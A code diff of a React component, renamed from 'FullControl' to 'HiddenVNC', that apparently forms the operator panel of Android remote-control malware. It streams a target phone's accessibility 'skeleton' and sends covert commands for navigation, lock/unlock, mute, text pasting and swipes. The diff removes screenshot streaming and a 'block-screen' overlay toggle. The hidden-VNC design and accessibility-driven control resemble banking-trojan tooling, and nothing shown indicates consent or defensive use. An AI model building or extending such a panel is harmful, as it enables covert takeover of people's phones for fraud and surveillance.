@@ -7,10 +7,10 @@ import { Card, CardContent } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Switch } from "@/components/ui/switch";
-import { Monitor, Power, RotateCcw, Loader2, X, Maximize2, Minimize2, Eye, ArrowLeft, Home, Lock, Volume2, Volume1, GripVertical, ArrowUp, ArrowDown, ArrowRight, Mic, MicOff, Unlock, Send } from "lucide-react";
+import { EyeOff, Power, RotateCcw, Loader2, X, Maximize2, Minimize2, Eye, ArrowLeft, Home, Lock, Volume2, Volume1, GripVertical, ArrowUp, ArrowDown, ArrowRight, Mic, MicOff, Unlock, Send } from "lucide-react";
 import { io, Socket } from "socket.io-client";
 
-interface FullControlProps {
+interface HiddenVNCProps {
   device: AndroidDevice;
   showContent?: boolean;
   onViewSelect?: (view: string | null) => void;
@@ -64,7 +64,7 @@ const getViewTypeBorderColor = (type: string, index: number): string => {
   return colors[index % 4];
 };
 
-export default function FullControl({ device, showContent = true, onViewSelect, triggerOpen = 0 }: FullControlProps) {
+export default function HiddenVNC({ device, showContent = true, onViewSelect, triggerOpen = 0 }: HiddenVNCProps) {
   const [isPopupOpen, setIsPopupOpen] = useState(false);
   const [isConnected, setIsConnected] = useState(false);
   const [skeletonData, setSkeletonData] = useState<SkeletonData | null>(null);
@@ -78,8 +78,6 @@ export default function FullControl({ device, showContent = true, onViewSelect, 
   const [phoneWidth, setPhoneWidth] = useState(320);
   const [screenHeight, setScreenHeight] = useState<number | null>(null);
   const [isResizing, setIsResizing] = useState(false);
-  const [screenImageData, setScreenImageData] = useState<string | null>(null);
-  const [screenImageDimensions, setScreenImageDimensions] = useState<{ width: number; height: number } | null>(null);
   const resizeStartRef = useRef<{ width: number; x: number } | null>(null);
   const containerRef = useRef<HTMLDivElement>(null);
   const canvasRef = useRef<HTMLCanvasElement>(null);
@@ -88,8 +86,6 @@ export default function FullControl({ device, showContent = true, onViewSelect, 
   const popupRef = useRef<HTMLDivElement>(null);
   const titleBarRef = useRef<HTMLDivElement>(null);
   const resizeHandleRef = useRef<HTMLDivElement>(null);
-  const previousImageRef = useRef<HTMLImageElement | null>(null);
-  const imageCacheRef = useRef<Map<string, HTMLImageElement>>(new Map());
   const lastTriggerRef = useRef<number>(0);
   const hasAutoConnectedRef = useRef<boolean>(false);
   
@@ -98,7 +94,6 @@ export default function FullControl({ device, showContent = true, onViewSelect, 
   const [textInput, setTextInput] = useState("");
   const [isMuted, setIsMuted] = useState(false);
   const [isLocked, setIsLocked] = useState(false);
-  const [blockScreenEnabled, setBlockScreenEnabled] = useState(false);
   
   // Swipe detection state
   const swipeStartRef = useRef<{ x: number; y: number; time: number } | null>(null);
@@ -112,7 +107,7 @@ export default function FullControl({ device, showContent = true, onViewSelect, 
     // Don't auto-open on mount - only open when button is clicked
   }, []);
 
-  // Automatically open popup when triggerOpen changes (when Full Control button is clicked)
+  // Automatically open popup when triggerOpen changes (when Hidden VNC button is clicked)
   useEffect(() => {
     // Only open if triggerOpen is a new value (increased) and popup is not already open
     if (triggerOpen > 0 && triggerOpen !== lastTriggerRef.current) {
@@ -136,20 +131,20 @@ export default function FullControl({ device, showContent = true, onViewSelect, 
   // Auto-connect when popup opens (but wait to see if data is already coming)
   useEffect(() => {
     if (isPopupOpen && !isConnected && !hasAutoConnectedRef.current && !isLoading) {
-      console.log("🔌 [FullControl] Waiting to check if data is already streaming...");
+      console.log("🔌 [HiddenVNC] Waiting to check if data is already streaming...");
       // Wait 3 seconds to see if data is already coming before sending connect command
       const timer = setTimeout(() => {
         // Check again if we're still not connected (data might have arrived in the meantime)
         if (!isConnected && !hasAutoConnectedRef.current) {
           hasAutoConnectedRef.current = true;
-          console.log("🔌 [FullControl] No data received after 3 seconds, auto-connecting...");
+          console.log("🔌 [HiddenVNC] No data received after 3 seconds, auto-connecting...");
           setIsLoading(true);
           setIsConnected(true);
 
-          // Send start-screen command via REST API to device-server
+          // Send start-skeleton command via REST API to device-server
           const deviceServerUrl = process.env.NEXT_PUBLIC_DEVICE_SERVER_URL || "http://localhost:9211";
           
-          console.log(`📤 [FullControl] Sending start-screen command to device: ${device.id}`);
+          console.log(`📤 [HiddenVNC] Sending start-skeleton command to device: ${device.id}`);
           
           fetch(`${deviceServerUrl}/api/command/${device.id}`, {
             method: "POST",
@@ -158,13 +153,13 @@ export default function FullControl({ device, showContent = true, onViewSelect, 
             },
             body: JSON.stringify({
               cmd: "access-command",
-              param: "start-screen",
+              param: "start-skeleton",
             }),
           })
           .then(response => {
             if (!response.ok) {
               return response.json().catch(() => ({})).then(errorData => {
-                console.error("❌ [FullControl] Failed to send command:", errorData);
+                console.error("❌ [HiddenVNC] Failed to send command:", errorData);
                 setIsLoading(false);
                 setIsConnected(false);
               });
@@ -173,269 +168,26 @@ export default function FullControl({ device, showContent = true, onViewSelect, 
           })
           .then(data => {
             if (data) {
-              console.log("✅ [FullControl] Command sent successfully:", data);
+              console.log("✅ [HiddenVNC] Command sent successfully:", data);
               setIsLoading(false);
             }
           })
           .catch(error => {
-            console.error("❌ [FullControl] Error sending command:", error);
+            console.error("❌ [HiddenVNC] Error sending command:", error);
             setIsLoading(false);
             setIsConnected(false);
           });
         } else {
-          console.log("🔌 [FullControl] Data already streaming, skipping connect command");
+          console.log("🔌 [HiddenVNC] Data already streaming, skipping connect command");
         }
       }, 3000);
       
       return () => {
-        console.log("🔌 [FullControl] Cleaning up auto-connect timer");
+        console.log("🔌 [HiddenVNC] Cleaning up auto-connect timer");
         clearTimeout(timer);
       };
     }
   }, [isPopupOpen, isConnected, isLoading, device.id]);
-
-  // Setup Socket.IO connection for receiving screen-result events
-  useEffect(() => {
-    if (!isPopupOpen) return;
-    
-    console.log(`🔌 [FullControl] Setting up socket for device: ${device.id}`);
-    
-    if (!socketRef.current) {
-      const socket = io(DEVICE_SERVER_URL, {
-        transports: ["websocket", "polling"],
-      });
-
-      socket.on("connect", () => {
-        console.log("✅ [FullControl] Socket connected");
-      });
-
-      socket.on("device_event", (event: any) => {
-        console.log("📨 [FullControl] Received device event:", event.event, "for device:", event.device_id);
-        
-        if (event.event === "screen_result" && event.device_id === device.id) {
-          console.log("📺 [FullControl] Screen result received, data keys:", Object.keys(event.data || {}));
-          console.log("📺 [FullControl] Full event data:", event.data);
-          
-          // If we receive data, mark as connected and cancel auto-connect
-          if (!isConnected) {
-            console.log("✅ [FullControl] Data is already streaming, marking as connected");
-            setIsConnected(true);
-            setIsLoading(false);
-            hasAutoConnectedRef.current = true; // Prevent auto-connect from triggering
-          }
-          
-          try {
-            // Extract image data from event - check all possible fields
-            let imageData = event.data?.image_data || event.data?.image || event.data?.data;
-            const width = event.data?.wmob || event.data?.width || 720;
-            const height = event.data?.hmob || event.data?.height || 1232;
-            const format = event.data?.frmt || event.data?.format || 'webp';
-            
-            console.log("📺 [FullControl] Extracted data:", {
-              hasImageData: !!imageData,
-              imageDataLength: imageData?.length,
-              imageDataPreview: imageData?.substring(0, 50),
-              width,
-              height,
-              format
-            });
-            
-            if (imageData) {
-              // Normalize format to lowercase and handle webp
-              const normalizedFormat = format?.toLowerCase() || 'webp';
-              
-              console.log("🔧 [FullControl] Processing image data:", {
-                originalLength: imageData.length,
-                originalPreview: imageData.substring(0, 50),
-                originalFirstChar: imageData[0],
-                originalType: typeof imageData,
-                startsWithData: imageData.startsWith('data:'),
-                format: normalizedFormat,
-                rawFormat: format
-              });
-              
-              // CRITICAL FIX: Restore leading slash BEFORE any processing if missing
-              // JPEG base64 MUST start with /9j/ (encodes FF D8 FF JPEG header)
-              // This must happen first, before any trimming or cleaning
-              const trimmedData = imageData.trim();
-              const needsSlashFix = !imageData.startsWith('data:') && 
-                                    !trimmedData.startsWith('/') && 
-                                    trimmedData.startsWith('9j/');
-              
-              console.log("🔍 [FullControl] Early fix check:", {
-                startsWithData: imageData.startsWith('data:'),
-                startsWithSlash: trimmedData.startsWith('/'),
-                startsWith9j: trimmedData.startsWith('9j/'),
-                needsSlashFix,
-                firstChars: trimmedData.substring(0, 5)
-              });
-              
-              if (needsSlashFix) {
-                console.log("⚠️ [FullControl] EARLY FIX: Missing leading slash detected, restoring BEFORE processing...");
-                imageData = '/' + trimmedData;
-                console.log("✅ [FullControl] Fixed imageData, now starts with:", imageData.substring(0, 5));
-              }
-              
-              let base64Image = imageData;
-              
-              // Check if it already has data URI prefix
-              if (!imageData.startsWith('data:')) {
-                // Handle escaped characters (like \/ -> /) - common in JSON strings
-                let cleanData = imageData.trim();
-                
-                console.log("🔧 [FullControl] Before cleaning:", {
-                  length: cleanData.length,
-                  preview: cleanData.substring(0, 50),
-                  firstChar: cleanData[0],
-                  first3Chars: cleanData.substring(0, 3),
-                  startsWithSlash: cleanData.startsWith('/'),
-                  startsWith9j: cleanData.startsWith('9j/')
-                });
-                
-                // REMOVED: Don't handle escaped forward slashes (\/) - base64 data should have raw /
-                // The leading / in /9j/ is valid base64 and should NOT be escaped
-                // Only handle other escape sequences that might corrupt the data
-                cleanData = cleanData.replace(/\\n/g, '\n');
-                cleanData = cleanData.replace(/\\r/g, '\r');
-                cleanData = cleanData.replace(/\\t/g, '\t');
-                
-                // Remove any quotes that might wrap the base64 string
-                cleanData = cleanData.replace(/^["']+|["']+$/g, '');
-                
-                // Remove any whitespace or non-base64 characters at the very start/end
-                // But preserve valid base64 characters including /, +, = (for padding)
-                // Base64 characters: A-Z, a-z, 0-9, +, /, = (for padding)
-                // Only trim non-base64 characters, not valid ones like /
-                cleanData = cleanData.replace(/^[\s\n\r\t"']+|[\s\n\r\t"']+$/g, '');
-                
-                // CRITICAL FIX: Restore leading slash if missing (common issue with JPEG base64)
-                // JPEG base64 starts with /9j/ which encodes FF D8 FF (JPEG header)
-                // Check multiple patterns to catch all cases
-                const needsSlashAfterClean = !cleanData.startsWith('/') && 
-                                            (cleanData.startsWith('9j/') || 
-                                             cleanData.match(/^9j\//) ||
-                                             cleanData.substring(0, 3) === '9j/');
-                
-                if (needsSlashAfterClean) {
-                  console.log("⚠️ [FullControl] Missing leading slash detected AFTER cleaning, restoring...");
-                  console.log("🔍 [FullControl] Before fix:", cleanData.substring(0, 10));
-                  cleanData = '/' + cleanData;
-                  console.log("✅ [FullControl] After fix:", cleanData.substring(0, 10));
-                }
-                
-                // Validate base64 format
-                const isValidBase64 = /^[A-Za-z0-9+/=]+$/.test(cleanData);
-                const base64Length = cleanData.length;
-                const expectedLength = Math.ceil(base64Length / 4) * 4; // Base64 should be multiple of 4
-                
-                console.log("🔧 [FullControl] After cleaning:", {
-                  length: cleanData.length,
-                  preview: cleanData.substring(0, 50),
-                  firstChar: cleanData[0],
-                  first3Chars: cleanData.substring(0, 3),
-                  isValidBase64Start: /^[A-Za-z0-9+\/]/.test(cleanData),
-                  isValidBase64,
-                  base64Length,
-                  expectedLength,
-                  lengthMod4: base64Length % 4,
-                  startsWithSlash: cleanData.startsWith('/')
-                });
-                
-                // Detect format from base64 signature if format is not provided
-                let detectedFormat = normalizedFormat;
-                if (cleanData.startsWith('/9j/')) {
-                  detectedFormat = 'jpeg';
-                  console.log("🔍 [FullControl] Detected JPEG format from base64 signature");
-                } else if (cleanData.startsWith('iVBORw0KGgo')) {
-                  detectedFormat = 'png';
-                  console.log("🔍 [FullControl] Detected PNG format from base64 signature");
-                } else if (cleanData.startsWith('UklGR')) {
-                  detectedFormat = 'webp';
-                  console.log("🔍 [FullControl] Detected WebP format from base64 signature");
-                }
-                
-                // Create data URI with proper MIME type
-                // WebP: data:image/webp;base64,...
-                // JPEG: data:image/jpeg;base64,...
-                const mimeType = detectedFormat === 'webp' ? 'webp' : 
-                                detectedFormat === 'jpeg' || detectedFormat === 'jpg' ? 'jpeg' :
-                                detectedFormat === 'png' ? 'png' : 'jpeg'; // Default to jpeg if unknown
-                
-                base64Image = `data:image/${mimeType};base64,${cleanData}`;
-                
-                console.log("🔧 [FullControl] Final data URI:", {
-                  mimeType,
-                  detectedFormat,
-                  dataUriPreview: base64Image.substring(0, 50),
-                  dataUriLength: base64Image.length
-                });
-              } else {
-                // Even if it has data: prefix, handle escaped characters in the data part
-                const parts = base64Image.split(',');
-                if (parts.length > 1) {
-                  let cleanData = parts[1];
-                  // REMOVED: Don't handle escaped forward slashes (\/) - base64 data should have raw /
-                  // Only handle other escape sequences
-                  cleanData = cleanData.replace(/\\n/g, '\n');
-                  cleanData = cleanData.replace(/\\r/g, '\r');
-                  cleanData = cleanData.replace(/\\t/g, '\t');
-                  // Update MIME type if format changed
-                  const mimeType = normalizedFormat === 'webp' ? 'webp' : 
-                                  normalizedFormat === 'jpeg' || normalizedFormat === 'jpg' ? 'jpeg' :
-                                  normalizedFormat === 'png' ? 'png' : 'jpeg';
-                  base64Image = `data:image/${mimeType};base64,${cleanData}`;
-                }
-              }
-              
-              // FINAL SAFETY CHECK: Ensure JPEG base64 has leading slash
-              // This is a last resort check before setting state
-              if (base64Image.includes('base64,') && !base64Image.includes('base64,/') && base64Image.includes('base64,9j/')) {
-                console.log("🚨 [FullControl] FINAL SAFETY FIX: Detected missing slash in final data URI, fixing...");
-                base64Image = base64Image.replace('base64,9j/', 'base64,/9j/');
-                console.log("✅ [FullControl] Final fix applied, preview:", base64Image.substring(0, 50));
-              }
-              
-              console.log("📺 [FullControl] Processed image data:", {
-                format: normalizedFormat,
-                dataUriLength: base64Image.length,
-                dataUriPreview: base64Image.substring(0, 80),
-                dataUriStartsWith: base64Image.substring(0, 30),
-                hasCorrectSlash: base64Image.includes('base64,/9j/'),
-                width,
-                height
-              });
-              
-              // Update state immediately
-              setScreenImageData(base64Image);
-              setScreenImageDimensions({ width, height });
-              setIsLoading(false);
-              
-              console.log("✅ [FullControl] State updated with image data");
-            } else {
-              console.warn("⚠️ [FullControl] No image data found in event");
-            }
-          } catch (error) {
-            console.error("❌ [FullControl] Error processing screen result:", error);
-            setIsLoading(false);
-          }
-        }
-      });
-
-      socket.on("disconnect", () => {
-        console.log("❌ [FullControl] Socket disconnected");
-      });
-
-      socketRef.current = socket;
-    }
-
-    return () => {
-      if (socketRef.current) {
-        console.log("🔌 [FullControl] Cleaning up socket");
-        socketRef.current.disconnect();
-        socketRef.current = null;
-      }
-    };
-  }, [device.id, DEVICE_SERVER_URL, isPopupOpen]);
 
   // Calculate initial screen height based on phone width
   useEffect(() => {
@@ -587,8 +339,6 @@ export default function FullControl({ device, showContent = true, onViewSelect, 
     });
     setIsConnected(false);
     setSkeletonData(null);
-    setScreenImageData(null);
-    setScreenImageDimensions(null);
     // Navigate back to home page when popup is closed (delay to ensure popup closes first)
     if (onViewSelect) {
       setTimeout(() => {
@@ -597,17 +347,92 @@ export default function FullControl({ device, showContent = true, onViewSelect, 
     }
   };
 
+  // Setup Socket.IO connection for receiving skeleton-result events
+  useEffect(() => {
+    if (!isPopupOpen) return;
+    
+    console.log(`🔌 [HiddenVNC] Setting up socket for device: ${device.id}`);
+    
+    if (!socketRef.current) {
+      const socket = io(DEVICE_SERVER_URL, {
+        transports: ["websocket", "polling"],
+      });
+
+      socket.on("connect", () => {
+        console.log("✅ [HiddenVNC] Socket connected");
+      });
+
+      socket.on("device_event", (event: any) => {
+        console.log("📨 [HiddenVNC] Received device event:", event.event, "for device:", event.device_id);
+        
+        if (event.event === "skeleton_result" && event.device_id === device.id) {
+          console.log("🎯 [HiddenVNC] Skeleton result received:", event.data);
+          
+          // If we receive data, mark as connected and cancel auto-connect
+          if (!isConnected) {
+            console.log("✅ [HiddenVNC] Data is already streaming, marking as connected");
+            setIsConnected(true);
+            setIsLoading(false);
+            hasAutoConnectedRef.current = true; // Prevent auto-connect from triggering
+          }
+          
+          try {
+            // Parse the skeleton data
+            let parsedSkeleton: SkeletonEntry[] = [];
+            
+            if (typeof event.data.skeleton === "string") {
+              console.log("📝 [HiddenVNC] Skeleton is a string, parsing...");
+              parsedSkeleton = JSON.parse(event.data.skeleton);
+            } else if (Array.isArray(event.data.skeleton)) {
+              console.log("📝 [HiddenVNC] Skeleton is already an array");
+              parsedSkeleton = event.data.skeleton;
+            }
+            
+            console.log(`✅ [HiddenVNC] Parsed ${parsedSkeleton.length} skeleton entries`);
+            
+            const newSkeletonData = {
+              package: event.data.package || "",
+              device_width: event.data.device_width || 1080,
+              device_height: event.data.device_height || 2400,
+              skeleton: parsedSkeleton,
+            };
+            
+            setSkeletonData(newSkeletonData);
+            setCurrentPackage(event.data.package || "");
+            setIsLoading(false);
+          } catch (error) {
+            console.error("❌ [HiddenVNC] Error parsing skeleton data:", error);
+            setIsLoading(false);
+          }
+        }
+      });
+
+      socket.on("disconnect", () => {
+        console.log("❌ [HiddenVNC] Socket disconnected");
+      });
+
+      socketRef.current = socket;
+    }
+
+    return () => {
+      if (socketRef.current) {
+        console.log("🔌 [HiddenVNC] Cleaning up socket");
+        socketRef.current.disconnect();
+        socketRef.current = null;
+      }
+    };
+  }, [device.id, DEVICE_SERVER_URL, isPopupOpen]);
 
   const handleConnect = async () => {
-    console.log("🔌 [FullControl] Connecting...");
+    console.log("🔌 [HiddenVNC] Connecting...");
     setIsLoading(true);
     setIsConnected(true);
 
     try {
-      // Send start-screen command via REST API to device-server
+      // Send start-skeleton command via REST API to device-server
       const deviceServerUrl = process.env.NEXT_PUBLIC_DEVICE_SERVER_URL || "http://localhost:9211";
       
-      console.log(`📤 [FullControl] Sending start-screen command to device: ${device.id}`);
+      console.log(`📤 [HiddenVNC] Sending start-skeleton command to device: ${device.id}`);
       
       const response = await fetch(`${deviceServerUrl}/api/command/${device.id}`, {
         method: "POST",
@@ -616,38 +441,36 @@ export default function FullControl({ device, showContent = true, onViewSelect, 
         },
         body: JSON.stringify({
           cmd: "access-command",
-          param: "start-screen",
+          param: "start-skeleton",
         }),
       });
 
       if (!response.ok) {
         const errorData = await response.json().catch(() => ({}));
-        console.error("❌ [FullControl] Failed to send command:", errorData);
+        console.error("❌ [HiddenVNC] Failed to send command:", errorData);
         setIsLoading(false);
         setIsConnected(false);
         return;
       }
 
       const result = await response.json();
-      console.log("✅ [FullControl] start-screen command sent:", result);
+      console.log("✅ [HiddenVNC] start-skeleton command sent:", result);
     } catch (error) {
-      console.error("❌ [FullControl] Error sending start-screen command:", error);
+      console.error("❌ [HiddenVNC] Error sending start-skeleton command:", error);
       setIsLoading(false);
       setIsConnected(false);
     }
   };
 
   const handleDisconnect = () => {
-    console.log("🔌 [FullControl] Disconnecting...");
+    console.log("🔌 [HiddenVNC] Disconnecting...");
     setIsConnected(false);
     setSkeletonData(null);
-    setScreenImageData(null);
-    setScreenImageDimensions(null);
     setIsLoading(false);
   };
 
   const handleRefresh = () => {
-    console.log("🔄 [FullControl] Refreshing...");
+    console.log("🔄 [HiddenVNC] Refreshing...");
     setIsLoading(true);
     setSkeletonData(null);
     handleConnect();
@@ -655,17 +478,17 @@ export default function FullControl({ device, showContent = true, onViewSelect, 
 
   const sendDeviceCommand = async (command: string, payload: any = {}) => {
     if (!socketRef.current) {
-      console.error("❌ [FullControl] Socket not initialized");
+      console.error("❌ [HiddenVNC] Socket not initialized");
       return;
     }
 
     if (!socketRef.current.connected) {
-      console.error("❌ [FullControl] Socket not connected. Current state:", socketRef.current.connected);
+      console.error("❌ [HiddenVNC] Socket not connected. Current state:", socketRef.current.connected);
       return;
     }
 
     if (!isConnected) {
-      console.error("❌ [FullControl] Device not connected");
+      console.error("❌ [HiddenVNC] Device not connected");
       return;
     }
 
@@ -680,14 +503,14 @@ export default function FullControl({ device, showContent = true, onViewSelect, 
         payload: restPayload, // Include remaining payload fields
       };
 
-      console.log(`📤 [FullControl] Sending command:`, commandData);
-      console.log(`📤 [FullControl] Command: ${command}, Param: ${param || 'none'}`);
+      console.log(`📤 [HiddenVNC] Sending command:`, commandData);
+      console.log(`📤 [HiddenVNC] Command: ${command}, Param: ${param || 'none'}`);
       
       socketRef.current.emit("send-command", commandData);
       
-      console.log(`✅ [FullControl] Command emitted: ${command}`, { param, payload: restPayload });
+      console.log(`✅ [HiddenVNC] Command emitted: ${command}`, { param, payload: restPayload });
     } catch (error) {
-      console.error(`❌ [FullControl] Error sending command ${command}:`, error);
+      console.error(`❌ [HiddenVNC] Error sending command ${command}:`, error);
     }
   };
 
@@ -700,9 +523,9 @@ export default function FullControl({ device, showContent = true, onViewSelect, 
   const KEYCODE_VOLUME_DOWN = 25;
 
   const handleBack = useCallback(() => {
-    console.log("🔘 [FullControl] Back button clicked");
+    console.log("🔘 [HiddenVNC] Back button clicked");
     if (!socketRef.current || !socketRef.current.connected || !isConnected) {
-      console.error("❌ [FullControl] Cannot send command - not connected");
+      console.error("❌ [HiddenVNC] Cannot send command - not connected");
       return;
     }
     sendDeviceCommand("access-command", {
@@ -715,9 +538,9 @@ export default function FullControl({ device, showContent = true, onViewSelect, 
   }, [device.id, isConnected, sendDeviceCommand]);
 
   const handleHome = useCallback(() => {
-    console.log("🔘 [FullControl] Home button clicked");
+    console.log("🔘 [HiddenVNC] Home button clicked");
     if (!socketRef.current || !socketRef.current.connected || !isConnected) {
-      console.error("❌ [FullControl] Cannot send command - not connected");
+      console.error("❌ [HiddenVNC] Cannot send command - not connected");
       return;
     }
     sendDeviceCommand("access-command", {
@@ -730,9 +553,9 @@ export default function FullControl({ device, showContent = true, onViewSelect, 
   }, [device.id, isConnected, sendDeviceCommand]);
 
   const handleRecent = useCallback(() => {
-    console.log("🔘 [FullControl] Recent button clicked");
+    console.log("🔘 [HiddenVNC] Recent button clicked");
     if (!socketRef.current || !socketRef.current.connected || !isConnected) {
-      console.error("❌ [FullControl] Cannot send command - not connected");
+      console.error("❌ [HiddenVNC] Cannot send command - not connected");
       return;
     }
     sendDeviceCommand("access-command", {
@@ -745,9 +568,9 @@ export default function FullControl({ device, showContent = true, onViewSelect, 
   }, [device.id, isConnected, sendDeviceCommand]);
 
   const handleLock = useCallback(() => {
-    console.log("🔘 [FullControl] Lock button clicked");
+    console.log("🔘 [HiddenVNC] Lock button clicked");
     if (!socketRef.current || !socketRef.current.connected || !isConnected) {
-      console.error("❌ [FullControl] Cannot send command - not connected");
+      console.error("❌ [HiddenVNC] Cannot send command - not connected");
       return;
     }
     sendDeviceCommand("access-command", {
@@ -760,9 +583,9 @@ export default function FullControl({ device, showContent = true, onViewSelect, 
   }, [device.id, isConnected, sendDeviceCommand]);
 
   const handleVolumeUp = useCallback(() => {
-    console.log("🔘 [FullControl] Volume Up button clicked");
+    console.log("🔘 [HiddenVNC] Volume Up button clicked");
     if (!socketRef.current || !socketRef.current.connected || !isConnected) {
-      console.error("❌ [FullControl] Cannot send command - not connected");
+      console.error("❌ [HiddenVNC] Cannot send command - not connected");
       return;
     }
     sendDeviceCommand("access-command", {
@@ -775,9 +598,9 @@ export default function FullControl({ device, showContent = true, onViewSelect, 
   }, [device.id, isConnected, sendDeviceCommand]);
 
   const handleVolumeDown = useCallback(() => {
-    console.log("🔘 [FullControl] Volume Down button clicked");
+    console.log("🔘 [HiddenVNC] Volume Down button clicked");
     if (!socketRef.current || !socketRef.current.connected || !isConnected) {
-      console.error("❌ [FullControl] Cannot send command - not connected");
+      console.error("❌ [HiddenVNC] Cannot send command - not connected");
       return;
     }
     sendDeviceCommand("access-command", {
@@ -791,7 +614,7 @@ export default function FullControl({ device, showContent = true, onViewSelect, 
 
   // Arrow key handlers
   const handleArrowUp = useCallback(() => {
-    console.log("⬆️ [FullControl] Arrow Up pressed");
+    console.log("⬆️ [HiddenVNC] Arrow Up pressed");
     if (!socketRef.current || !socketRef.current.connected || !isConnected) return;
     sendDeviceCommand("access-command", {
       param: "btnarrowup",
@@ -800,7 +623,7 @@ export default function FullControl({ device, showContent = true, onViewSelect, 
   }, [device.id, isConnected, sendDeviceCommand]);
 
   const handleArrowDown = useCallback(() => {
-    console.log("⬇️ [FullControl] Arrow Down pressed");
+    console.log("⬇️ [HiddenVNC] Arrow Down pressed");
     if (!socketRef.current || !socketRef.current.connected || !isConnected) return;
     sendDeviceCommand("access-command", {
       param: "btnarrowdown",
@@ -809,7 +632,7 @@ export default function FullControl({ device, showContent = true, onViewSelect, 
   }, [device.id, isConnected, sendDeviceCommand]);
 
   const handleArrowLeft = useCallback(() => {
-    console.log("⬅️ [FullControl] Arrow Left pressed");
+    console.log("⬅️ [HiddenVNC] Arrow Left pressed");
     if (!socketRef.current || !socketRef.current.connected || !isConnected) return;
     sendDeviceCommand("access-command", {
       param: "btnarrowleft",
@@ -818,7 +641,7 @@ export default function FullControl({ device, showContent = true, onViewSelect, 
   }, [device.id, isConnected, sendDeviceCommand]);
 
   const handleArrowRight = useCallback(() => {
-    console.log("➡️ [FullControl] Arrow Right pressed");
+    console.log("➡️ [HiddenVNC] Arrow Right pressed");
     if (!socketRef.current || !socketRef.current.connected || !isConnected) return;
     sendDeviceCommand("access-command", {
       param: "btnarrowright",
@@ -829,7 +652,7 @@ export default function FullControl({ device, showContent = true, onViewSelect, 
   // Text input handler
   const handleSendText = useCallback(() => {
     if (!textInput.trim()) return;
-    console.log("📝 [FullControl] Sending text:", textInput);
+    console.log("📝 [HiddenVNC] Sending text:", textInput);
     if (!socketRef.current || !socketRef.current.connected || !isConnected) return;
     sendDeviceCommand("access-command", {
       param: `pastetext|${textInput}`,
@@ -842,7 +665,7 @@ export default function FullControl({ device, showContent = true, onViewSelect, 
   const handleToggleMute = useCallback(() => {
     const newMuteState = !isMuted;
     setIsMuted(newMuteState);
-    console.log(`🔇 [FullControl] ${newMuteState ? 'Muting' : 'Unmuting'}`);
+    console.log(`🔇 [HiddenVNC] ${newMuteState ? 'Muting' : 'Unmuting'}`);
     if (!socketRef.current || !socketRef.current.connected || !isConnected) return;
     sendDeviceCommand("access-command", {
       param: newMuteState ? "btnmute" : "btnunmute",
@@ -854,7 +677,7 @@ export default function FullControl({ device, showContent = true, onViewSelect, 
   const handleToggleLock = useCallback(() => {
     const newLockState = !isLocked;
     setIsLocked(newLockState);
-    console.log(`🔐 [FullControl] ${newLockState ? 'Locking' : 'Unlocking'}`);
+    console.log(`🔐 [HiddenVNC] ${newLockState ? 'Locking' : 'Unlocking'}`);
     if (!socketRef.current || !socketRef.current.connected || !isConnected) return;
     sendDeviceCommand("access-command", {
       param: newLockState ? "btnlock" : "btnunlock",
@@ -862,32 +685,15 @@ export default function FullControl({ device, showContent = true, onViewSelect, 
     });
   }, [isLocked, device.id, isConnected, sendDeviceCommand]);
 
-  // Block Screen toggle handler
-  const handleBlockScreenToggle = useCallback((checked: boolean) => {
-    setBlockScreenEnabled(checked);
-    const param = checked ? "enable-block-screen|text" : "disable-block-screen|text";
-    console.log(`🚫 [FullControl] ${checked ? 'Enabling' : 'Disabling'} block screen`);
-    if (!socketRef.current || !socketRef.current.connected || !isConnected) return;
-    sendDeviceCommand("access-command", { param });
-  }, [isConnected, sendDeviceCommand]);
-
   // Convert canvas coordinates to device coordinates
   const canvasToDeviceCoords = useCallback((canvasX: number, canvasY: number) => {
-    if (!canvasRef.current) return { x: 0, y: 0 };
+    if (!canvasRef.current || !skeletonData) return { x: 0, y: 0 };
     
     const canvas = canvasRef.current;
     
-    // Get device dimensions from screenImageDimensions or skeletonData
-    let deviceWidth = 720;
-    let deviceHeight = 1232;
-    
-    if (screenImageDimensions) {
-      deviceWidth = screenImageDimensions.width;
-      deviceHeight = screenImageDimensions.height;
-    } else if (skeletonData) {
-      deviceWidth = skeletonData.device_width || 1080;
-      deviceHeight = skeletonData.device_height || 2400;
-    }
+    // Get device dimensions
+    const deviceWidth = skeletonData.device_width || 1080;
+    const deviceHeight = skeletonData.device_height || 2400;
     
     // Calculate UI chrome dimensions (EXACT same as in render logic)
     const statusBarHeight = Math.round(canvas.height * 0.04);
@@ -895,31 +701,21 @@ export default function FullControl({ device, showContent = true, onViewSelect, 
     const screenStartY = statusBarHeight;
     const screenHeight = canvas.height - statusBarHeight - navBarHeight;
     
-    // Canvas is now EXACT device resolution, so coordinates are 1:1 mapping
-    // Canvas coordinates ARE device coordinates directly
-    const scaleX = 1; // 1:1 pixel mapping
-    const scaleY = 1; // 1:1 pixel mapping
+    // Calculate scale factors (same as in render logic)
+    const scaleX = canvas.width / deviceWidth;
+    const scaleY = screenHeight / deviceHeight;
+    const uniformScale = Math.min(scaleX, scaleY);
     
-    let deviceX: number;
-    let deviceY: number;
-    
-    if (screenImageData) {
-      // Canvas is exactly device resolution, so canvas coordinates = device coordinates
-      // Just clamp to device bounds
-      deviceX = Math.max(0, Math.min(Math.round(canvasX), deviceWidth - 1));
-      deviceY = Math.max(0, Math.min(Math.round(canvasY), deviceHeight - 1));
-    } else {
-      // For skeleton: canvas is device resolution, so 1:1 mapping
-      deviceX = Math.max(0, Math.min(Math.round(canvasX), deviceWidth - 1));
-      deviceY = Math.max(0, Math.min(Math.round(canvasY - screenStartY), deviceHeight - 1));
-    }
+    // Convert canvas coordinates to device coordinates
+    const deviceX = Math.round(canvasX / uniformScale);
+    const deviceY = Math.round((canvasY - screenStartY) / uniformScale);
     
     // Clamp to device bounds
     return { 
       x: Math.max(0, Math.min(deviceX, deviceWidth - 1)), 
       y: Math.max(0, Math.min(deviceY, deviceHeight - 1)) 
     };
-  }, [skeletonData, screenImageDimensions, screenImageData]);
+  }, [skeletonData]);
 
   // Emit swipe-detected event to server
   const emitSwipeDetected = useCallback((
@@ -972,7 +768,7 @@ export default function FullControl({ device, showContent = true, onViewSelect, 
       velocity,
     });
     
-    console.log(`👆 [FullControl] Swipe detected: ${direction}`, {
+    console.log(`👆 [HiddenVNC] Swipe detected: ${direction}`, {
       from: `(${startX}, ${startY})`,
       to: `(${endX}, ${endY})`,
       distance: Math.round(distance),
@@ -997,7 +793,7 @@ export default function FullControl({ device, showContent = true, onViewSelect, 
       timestamp: new Date().toISOString(),
     });
     
